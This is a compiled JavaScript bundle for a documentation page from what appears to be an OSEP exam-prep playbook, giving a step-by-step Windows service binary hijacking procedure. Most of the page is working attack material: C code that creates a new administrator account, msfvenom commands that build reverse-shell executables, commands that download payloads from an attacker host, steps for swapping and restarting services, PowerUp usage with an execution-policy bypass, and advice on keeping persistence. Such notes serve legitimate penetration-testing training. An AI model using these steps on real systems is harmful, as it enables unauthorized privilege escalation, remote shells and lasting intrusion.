"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[8665],{4243(e,n,s){s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>c,default:()=>d,frontMatter:()=>t,metadata:()=>i,toc:()=>o});const i=JSON.parse('{"id":"osep/Privilege Escalation/Service Binary Hijacking","title":"Service Binary Hijacking","description":"Service Binary Hijacking","source":"@site/docs/osep/Privilege Escalation/Service Binary Hijacking.md","sourceDirName":"osep/Privilege Escalation","slug":"/osep/Privilege Escalation/Service Binary Hijacking","permalink":"/OSEP-Playbook/docs/osep/Privilege Escalation/Service Binary Hijacking","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"PowerShell Goldmine","permalink":"/OSEP-Playbook/docs/osep/Privilege Escalation/PowerShell Goldmine"},"next":{"title":"Disable AMSI","permalink":"/OSEP-Playbook/docs/osep/Defense Evasion/Disable AMSI"}}');var r=s(4848),a=s(8453);const t={},c=void 0,l={},o=[{value:"<strong>Service Binary Hijacking</strong>",id:"service-binary-hijacking",level:3},{value:"<strong>Basic and Main Checks</strong>",id:"basic-and-main-checks",level:3},{value:"<strong>Additional Optional Checks</strong>",id:"additional-optional-checks",level:3}];function h(e){const n={code:"code",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h3,{id:"service-binary-hijacking",children:(0,r.jsx)(n.strong,{children:"Service Binary Hijacking"})}),"\n",(0,r.jsx)(n.h3,{id:"basic-and-main-checks",children:(0,r.jsx)(n.strong,{children:"Basic and Main Checks"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Check Running Services"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"# Tip: Look for services with paths outside of `system32` or other unexpected locations.; try to find that thing that seems out of place.\nGet-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}\n\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Review Permissions of a Service"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'icacls "C:\\Path\\To\\ServiceBinary.exe"\n\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Obtain Startup Type of a Service"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -eq '<ServiceName>'}\n\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Creating an Executable That Adds a New Administrator User"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'#include <stdlib.h>int main ()\n{\n  system("net user emma Password123! /add");\n  system("net localgroup administrators emma /add");\n  return 0;\n}\n\n'})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Cross-Compile the C Code to a 64-bit Application\nx86_64-w64-mingw32-gcc adduser.c -o adduser.exe\n\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Creating an Executable that is a Reverse Shell"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# For 64-bit executable\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe\n\n# For 32-bit executable\nmsfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe\n\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Replacing the Service Binary with a Malicious Binary"}),"\xa0It can be a reverse shell generated from\xa0",(0,r.jsx)(n.code,{children:"msfvenom"}),"\xa0or for example the program above that will add a new user to the system."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'# Remember to run the HTTP server on your Kali to be able to bring the binary.\niwr -uri http://<attacker-ip>/adduser.exe -Outfile adduser.exe\n\nmove "C:\\Path\\To\\ServiceBinary.exe" "C:\\Path\\To\\Backup\\ServiceBinary.exe"\n\nmove .\\adduser.exe "C:\\Path\\To\\ServiceBinary.exe"\n\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Restart the Service"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Using PowerShell Function"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"Restart-Service -Name '<ServiceName>'\n\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["Using\xa0",(0,r.jsx)(n.code,{children:"sc.exe"})]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"sc.exe stop <ServiceName>\nsc.exe start <ServiceName>\n\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Restart the System"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"# First check for reboot privileges: SeShutdownPrivilege should be Assigned and Enabled.\nwhoami /priv\n\n# Perform the restart\nshutdown /r /t 0\n\n"})}),"\n",(0,r.jsx)(n.h3,{id:"additional-optional-checks",children:(0,r.jsx)(n.strong,{children:"Additional Optional Checks"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Automating the Process with PowerUp"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Start the HTTP server"}),"\xa0in our Kali with the script in the folder."]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .\npython3 -m http.server 80\n\n"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Bring the script"}),"\xa0and run it."]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"iwr -uri http://<attacker-ip>/PowerUp.ps1 -Outfile PowerUp.ps1\n\npowershell -ep bypass\n. .\\PowerUp.ps1\n\nGet-ModifiableServiceFile\n\nInstall-ServiceBinary -Name '<ServiceName>'\n\n"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:["(",(0,r.jsx)(n.strong,{children:"Optional"}),") Find files and check paths for which our current user can modify."]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"$ModifiableFiles = echo 'C:\\Path\\To\\ServiceBinary.exe' | Get-ModifiablePath -Literal\n\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Script to find Services with Weak Permissions"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"Get-CimInstance -ClassName win32_service | Select Name, PathName | ForEach-Object {\n    $path = $_.PathName -replace '\"', ''\n    if (Test-Path $path) {\n        icacls $path\n    }\n}\n\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Inspect Service Dependencies"}),"\xa0Some services use configuration files that can be hijacked similarly to service binaries."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"# List service dependencies\nGet-CimInstance -ClassName win32_service | Select Name, PathName, DependentServices | Where-Object {$_.DependentServices -ne $null}\n\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Check for Service Configuration File Hijacking"}),"\xa0Services often have dependencies that might also be vulnerable. Check dependencies to identify additional attack vectors."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'# Some services use configuration files that can be hijacked similarly to service binaries. Example: Checking permissions on a configuration file\nicacls "C:\\Path\\To\\Service\\ConfigFile.ini"\n\n'})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Service Binary Analysis"}),"\xa0Keep. in mind that some of the PWK machines were solved using reverse engineering to find hardcoded credentials or important strings; so perform static analysis of the service binary to understand its behavior and identify potential weaknesses or vulnerabilities."]}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Bring the binary"}),"\xa0to the Kali: If you are using some\xa0",(0,r.jsx)(n.code,{children:"impacket-tool"}),"\xa0you can use their built-in function to bring the file; but if you are using a reverse shell use the steps from the\xa0",(0,r.jsx)(n.strong,{children:"Section 17.6"}),"\xa0of this cheatsheet."]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Perform the analysis"}),"\xa0with multiple tools"]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"strings [downloaded_binary]\n\nflare-floss [downloaded_binary]\n\n# Use dnSpy if you know that the binary was built using .NET.\n\n# You could also use tools like PEiD, IDA Pro, or Ghidra to analyze the binary (this is not recommended because the exam is usually not that complex and you could be going into a rabbit hole).\n\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Monitor Service Activity"}),"\xa0After replacing the service binary, monitor system activity to ensure that the new binary is executed correctly and to identify any issues."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'Get-WinEvent -LogName System | Where-Object {$_.Message -like "*<ServiceName>*"}\n\n'})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Ensure Persistence"}),"\xa0For maintaining access, ensure that the changes are persistent across reboots and do not get overwritten by updates or system checks."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"# Check for system update settings that might revert changes\nGet-WindowsUpdateLog\n"})})]})}function d(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(h,{...e})}):h(e)}},8453(e,n,s){s.d(n,{R:()=>t,x:()=>c});var i=s(6540);const r={},a=i.createContext(r);function t(e){const n=i.useContext(a);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:t(e.components),i.createElement(a.Provider,{value:n},e.children)}}}]);